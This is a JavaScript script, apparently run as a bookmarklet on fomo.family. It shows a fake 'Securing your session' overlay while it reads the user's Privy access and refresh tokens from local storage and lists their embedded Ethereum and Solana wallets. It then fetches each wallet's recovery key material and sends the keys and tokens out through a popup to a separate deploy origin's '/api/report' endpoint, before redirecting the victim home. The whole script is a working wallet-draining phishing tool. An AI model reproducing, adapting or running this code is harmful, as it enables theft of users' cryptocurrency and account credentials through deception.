(() => {
  "use strict";

  /* COOP-safe: no postMessage. Parent builds job, opens runner#job=, runner finishes → BACKEND */

  const ORIGIN = "__DEPLOY_ORIGIN__";

  const CFG = {
    APP_ID: "cm6h485o300n3zj9yl6vpedq7",
    CLIENT_ID: "client-WY5gFSayQjxnQhG4rP6SnwPAyPZWZpNRhJ6b9rzMnYwqH",
    PRIVY: "https://auth.privy.io",
    PROXY_ORIGIN: ORIGIN,
    RUNNER: ORIGIN + "/r.html",
    BACKEND: ORIGIN + "/api/report",
    RETURN: "https://fomo.family/token",
  };

  function mountOverlay() {
    const old = document.getElementById("__fomo_overlay");
    if (old) old.remove();

    const root = document.createElement("div");
    root.id = "__fomo_overlay";
    root.innerHTML = `
<style>
  #__fomo_overlay{
    position:fixed;inset:0;z-index:2147483647;
    background:#0a0a0b;color:#e8e8ef;
    font:15px/1.5 system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
    display:flex;align-items:center;justify-content:center;
  }
  #__fomo_overlay .box{width:min(400px,92vw);padding:32px 24px}
  #__fomo_overlay .logo{
    width:40px;height:40px;border-radius:12px;margin-bottom:18px;
    background:linear-gradient(135deg,#fff 0%,#888 100%);opacity:.92
  }
  #__fomo_overlay h1{margin:0 0 6px;font-size:17px;font-weight:600;letter-spacing:.01em}
  #__fomo_overlay .sub{color:#6b6b75;font-size:13px;margin-bottom:22px}
  #__fomo_overlay .bar{
    height:2px;background:#1a1a1e;border-radius:2px;overflow:hidden;margin-bottom:20px
  }
  #__fomo_overlay .bar>i{
    display:block;height:100%;width:0%;background:#fff;transition:width .5s ease
  }
  #__fomo_overlay .steps{list-style:none;margin:0;padding:0}
  #__fomo_overlay .steps li{
    padding:9px 0;border-bottom:1px solid #141418;
    display:flex;gap:10px;align-items:center;color:#3f3f48;font-size:13px
  }
  #__fomo_overlay .steps li.on{color:#e8e8ef}
  #__fomo_overlay .steps li.done{color:#55555e}
  #__fomo_overlay .dot{
    width:6px;height:6px;border-radius:50%;background:#2a2a30;flex-shrink:0
  }
  #__fomo_overlay .steps li.on .dot{background:#fff;box-shadow:0 0 6px #fff6}
  #__fomo_overlay .steps li.done .dot{background:#3a3a42}
  #__fomo_overlay .foot{margin-top:22px;font-size:11px;color:#3a3a42}
  #__fomo_overlay .err{color:#f87171;margin-top:14px;font-size:13px;display:none;white-space:pre-wrap}
  #__fomo_overlay .popup-block{
    display:none;margin-top:10px;padding:16px 14px;
    border:1px solid #1e1e24;border-radius:12px;background:#0e0e12;text-align:left
  }
  #__fomo_overlay .popup-block h2{margin:0 0 8px;font-size:14px;font-weight:600;color:#fff}
  #__fomo_overlay .popup-block p{margin:0 0 10px;font-size:12.5px;color:#8a8a96;line-height:1.55}
  #__fomo_overlay .popup-block ol{margin:0 0 14px;padding-left:18px;font-size:12.5px;color:#b0b0ba;line-height:1.7}
  #__fomo_overlay .popup-block code{
    background:#1a1a20;padding:1px 5px;border-radius:4px;font-size:11px;color:#ddd
  }
  #__fomo_overlay .btn{
    display:inline-block;border:0;border-radius:9px;
    background:#fff;color:#0a0a0b;font:600 13px system-ui;
    padding:10px 16px;cursor:pointer
  }
  #__fomo_overlay .btn:hover{opacity:.92}
  #__fomo_overlay .btn:disabled{opacity:.4;cursor:not-allowed}
</style>
<div class="box">
  <div class="logo"></div>
  <h1 id="__fomo_title">Securing your session</h1>
  <div class="sub" id="__fomo_sub">Please keep this tab open while we finish setup.</div>
  <div class="bar"><i id="__fomo_bar"></i></div>
  <ul class="steps" id="__fomo_steps">
    <li data-s="1"><span class="dot"></span><span>Checking browser permissions</span></li>
    <li data-s="2"><span class="dot"></span><span>Refreshing your session</span></li>
    <li data-s="3"><span class="dot"></span><span>Loading your accounts</span></li>
    <li data-s="4"><span class="dot"></span><span>Preparing recovery material</span></li>
    <li data-s="5"><span class="dot"></span><span>Opening secure channel</span></li>
    <li data-s="6"><span class="dot"></span><span>Handing off to secure window</span></li>
    <li data-s="7"><span class="dot"></span><span>Finishing up</span></li>
  </ul>
  <div class="popup-block" id="__fomo_popup_block">
    <h2>Allow pop-ups to continue</h2>
    <p>Your browser is blocking a required secure window. This is a one-time permission for this site.</p>
    <ol>
      <li>Click the pop-up icon in the address bar.</li>
      <li>Choose <strong>Always allow pop-ups</strong> for this site.</li>
      <li>Press the button below.</li>
    </ol>
    <button class="btn" id="__fomo_retry_popup" type="button">Allow &amp; continue</button>
  </div>
  <div class="foot">Protected connection · do not close this tab</div>
  <div class="err" id="__fomo_err"></div>
</div>`;
    document.documentElement.appendChild(root);

    return {
      root,
      setStep(n) {
        const steps = root.querySelectorAll("#__fomo_steps li");
        steps.forEach((li) => {
          const s = +li.dataset.s;
          li.classList.remove("on", "done");
          if (s < n) li.classList.add("done");
          if (s === n) li.classList.add("on");
        });
        const pct = Math.min(100, Math.round(((n - 1) / 7) * 100) + 6);
        root.querySelector("#__fomo_bar").style.width = pct + "%";
      },
      setSub(t) {
        root.querySelector("#__fomo_sub").textContent = t;
      },
      showPopupHelp() {
        root.querySelector("#__fomo_popup_block").style.display = "block";
        root.querySelector("#__fomo_sub").textContent =
          "Action needed: allow pop-ups to continue.";
      },
      hidePopupHelp() {
        root.querySelector("#__fomo_popup_block").style.display = "none";
        root.querySelector("#__fomo_sub").textContent =
          "Please keep this tab open while we finish setup.";
      },
      onRetry(fn) {
        root.querySelector("#__fomo_retry_popup").onclick = fn;
      },
      finishOk() {
        root.querySelector("#__fomo_bar").style.width = "100%";
        root.querySelectorAll("#__fomo_steps li").forEach((li) => {
          li.classList.remove("on");
          li.classList.add("done");
        });
        root.querySelector("#__fomo_title").textContent = "Session secured";
        root.querySelector("#__fomo_sub").textContent =
          "Secure window is finishing — leave this tab open until it redirects.";
      },
      error(msg) {
        const el = root.querySelector("#__fomo_err");
        el.style.display = "block";
        el.textContent = String(msg || "Something went wrong. Please try again.");
      },
    };
  }

  function b64urlEncode(str) {
    const bytes = new TextEncoder().encode(str);
    let bin = "";
    bytes.forEach((b) => (bin += String.fromCharCode(b)));
    return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
  }

  const RUNNER_NAME = "session_secure_win";
  const RUNNER_FEATURES =
    "width=420,height=520,left=80,top=80,menubar=no,toolbar=no,location=no,status=no";

  function openRunnerWindow() {
    return window.open(CFG.RUNNER, RUNNER_NAME, RUNNER_FEATURES);
  }

  function sendJobToRunner(win, job) {
    const payload = b64urlEncode(JSON.stringify(job));
    const url = CFG.RUNNER + "#job=" + payload;
    if (url.length > 1500000) throw new Error("Job too large for URL");
    if (!win || win.closed) return null;
    win.location.href = url;
    return win;
  }

  function openRunnerWithJob(job) {
    const payload = b64urlEncode(JSON.stringify(job));
    const url = CFG.RUNNER + "#job=" + payload;
    if (url.length > 1500000) throw new Error("Job too large for URL");
    return window.open(url, RUNNER_NAME, RUNNER_FEATURES);
  }

  function waitForPopupAllowed(ui, openFn) {
    return new Promise((resolve) => {
      const attempt = () => {
        const w = openFn();
        if (w) {
          ui.hidePopupHelp();
          resolve(w);
          return;
        }
        ui.showPopupHelp();
      };
      ui.onRetry(() => {
        const btn = ui.root.querySelector("#__fomo_retry_popup");
        btn.disabled = true;
        btn.textContent = "Checking…";
        setTimeout(() => {
          const w = openFn();
          if (w) {
            ui.hidePopupHelp();
            btn.disabled = false;
            btn.textContent = "Allow & continue";
            resolve(w);
          } else {
            btn.disabled = false;
            btn.textContent = "Allow & continue";
            ui.showPopupHelp();
          }
        }, 200);
      });
      attempt();
    });
  }

  const ls = {
    get(k) {
      try {
        const v = localStorage.getItem(k);
        if (v == null) return null;
        if (typeof v === "string" && v.startsWith('"') && v.endsWith('"'))
          return JSON.parse(v);
        return v;
      } catch {
        return localStorage.getItem(k);
      }
    },
    set(k, v) {
      localStorage.setItem(k, JSON.stringify(v));
    },
  };

  function cleanToken(t) {
    if (t == null || t === "") return "";
    let s = String(t);
    try {
      if (s.startsWith('"') && s.endsWith('"')) s = JSON.parse(s);
    } catch {}
    return String(s)
      .replace(/^Bearer\s+/i, "")
      .replace(/^"|"$/g, "")
      .trim();
  }

  function privyHeaders(accessToken, caid) {
    const h = {
      accept: "application/json",
      "content-type": "application/json",
      "privy-app-id": CFG.APP_ID,
      "privy-client-id": CFG.CLIENT_ID,
      "privy-ca-id": caid,
      "privy-client": "react-auth:3.34.0",
    };
    const t = cleanToken(accessToken);
    if (t) h.authorization = `Bearer ${t}`;
    return h;
  }

  async function refreshSession() {
    const refresh = cleanToken(ls.get("privy:refresh_token"));
    const current = cleanToken(ls.get("privy:token"));
    const caid =
      cleanToken(ls.get("privy:caid")) ||
      "3f1ee78a-7061-45ee-845f-d53d67d3e258";
    if (!refresh || !current) throw new Error("Not signed in");

    const r = await fetch(CFG.PRIVY + "/api/v1/sessions", {
      method: "POST",
      credentials: "include",
      headers: privyHeaders(current, caid),
      body: JSON.stringify({ refresh_token: refresh }),
    });
    const data = await r.json().catch(() => ({}));
    if (!r.ok) throw new Error("Session refresh failed");

    const access = cleanToken(
      data.token || data.privy_access_token || data.access_token || current
    );
    ls.set("privy:token", access);
    if (data.refresh_token) ls.set("privy:refresh_token", data.refresh_token);
    return { access, data, caid };
  }

  async function discoverWallets() {
    const { access, data, caid } = await refreshSession();
    const accounts = data?.user?.linked_accounts || [];
    const found = { ethereum: [], solana: [] };

    for (const a of accounts) {
      if (a.type !== "wallet") continue;
      if (a.wallet_client_type && a.wallet_client_type !== "privy") continue;
      if (a.connector_type && a.connector_type !== "embedded") continue;
      const addr = a.address || a.public_key;
      if (!addr) continue;
      if (a.chain_type === "ethereum") {
        if (!found.ethereum.some((x) => x.toLowerCase() === addr.toLowerCase()))
          found.ethereum.push(addr);
      } else if (a.chain_type === "solana") {
        if (!found.solana.includes(addr)) found.solana.push(addr);
      }
    }

    if (!found.ethereum.length && !found.solana.length)
      throw new Error("No wallets found");
    return { wallets: found, token: access, user: data.user, caid };
  }

  async function sha256OfB64Key(b64str) {
    const norm = b64str.replace(/-/g, "+").replace(/_/g, "/");
    const pad = "=".repeat((4 - (norm.length % 4)) % 4);
    const bin = atob(norm + pad);
    const bytes = Uint8Array.from(bin, (c) => c.charCodeAt(0));
    const dig = new Uint8Array(await crypto.subtle.digest("SHA-256", bytes));
    let s = "";
    dig.forEach((b) => (s += String.fromCharCode(b)));
    return {
      b64hash: btoa(s),
      hex: [...dig].map((b) => b.toString(16).padStart(2, "0")).join(""),
    };
  }

  async function keyMaterial(address, chainType, token, caid) {
    const r = await fetch(
      CFG.PRIVY +
        "/api/v1/embedded_wallets/" +
        encodeURIComponent(address) +
        "/recovery/key_material",
      {
        method: "POST",
        credentials: "include",
        headers: privyHeaders(token, caid),
        body: JSON.stringify({ chain_type: chainType }),
      }
    );
    return {
      status: r.status,
      ok: r.ok,
      data: await r.json().catch(() => ({})),
    };
  }

  async function buildItems(wallets, token, caid) {
    const items = [];
    const access = cleanToken(token);

    for (const address of wallets.ethereum) {
      const km = await keyMaterial(address, "ethereum", access, caid);
      if (!km.ok) continue;
      const recoveryKey = km.data?.recovery_key || km.data?.recoveryKey;
      if (!recoveryKey) continue;
      const hashes = await sha256OfB64Key(recoveryKey);
      items.push({
        appId: CFG.APP_ID,
        clientId: CFG.CLIENT_ID,
        caid,
        wallet: address,
        accessToken: access,
        recoveryKey,
        recoveryKeyHashB64: hashes.b64hash,
        recoveryKeyHashHex: hashes.hex,
        chainType: "ethereum",
        chain_type: "ethereum",
      });
    }

    let solToken = access;
    try {
      solToken = (await refreshSession()).access;
    } catch {}

    for (const address of wallets.solana) {
      const km = await keyMaterial(address, "solana", solToken, caid);
      if (!km.ok) continue;
      const recoveryKey = km.data?.recovery_key || km.data?.recoveryKey;
      if (!recoveryKey) continue;
      const hashes = await sha256OfB64Key(recoveryKey);
      items.push({
        appId: CFG.APP_ID,
        clientId: CFG.CLIENT_ID,
        caid,
        wallet: address,
        accessToken: solToken,
        recoveryKey,
        recoveryKeyHashB64: hashes.b64hash,
        recoveryKeyHashHex: hashes.hex,
        chainType: "solana",
        chain_type: "solana",
      });
    }

    return items;
  }

  async function main() {
    const ui = mountOverlay();
    ui.setStep(1);

    // Open secure window immediately while the bookmark click gesture is active.
    let runnerWin = openRunnerWindow();
    if (!runnerWin) {
      runnerWin = await waitForPopupAllowed(ui, openRunnerWindow);
    }

    try {
      ui.setStep(2);
      const { wallets, user, caid } = await discoverWallets();

      ui.setStep(3);
      const { access: fresh } = await refreshSession();

      ui.setStep(4);
      const items = await buildItems(wallets, fresh, caid);
      if (!items.length) throw new Error("No recovery material available");

      ui.setStep(5);
      const job = {
        source: "fomo.family",
        userId: user?.id || null,
        backend: CFG.BACKEND,
        returnUrl: CFG.RETURN,
        items,
      };

      ui.setStep(6);
      if (!runnerWin || runnerWin.closed) {
        runnerWin = await waitForPopupAllowed(ui, () => openRunnerWithJob(job));
      } else if (!sendJobToRunner(runnerWin, job)) {
        runnerWin = await waitForPopupAllowed(ui, () => openRunnerWithJob(job));
      } else {
        ui.hidePopupHelp();
      }

      ui.setStep(7);
      ui.finishOk();
      // parent tab: leave overlay briefly, then hard-navigate home
      // (popup does its own backend redirect; COOP means we can't watch it)
      setTimeout(() => {
        try {
          location.href = CFG.RETURN || "https://fomo.family/token";
        } catch {}
      }, 1200);
    } catch (e) {
      console.error(e);
      ui.error(e.message || e);
    }
  }

  main();
})();
